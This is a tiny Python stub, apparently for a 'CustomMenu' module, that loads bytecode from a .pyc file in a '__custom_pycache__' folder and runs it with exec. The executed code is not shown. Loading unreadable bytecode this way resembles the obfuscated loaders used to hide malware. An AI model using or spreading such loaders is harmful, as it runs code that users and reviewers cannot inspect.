
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'CustomMenu_afc83760d1db4c94b721be305a60c95a.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
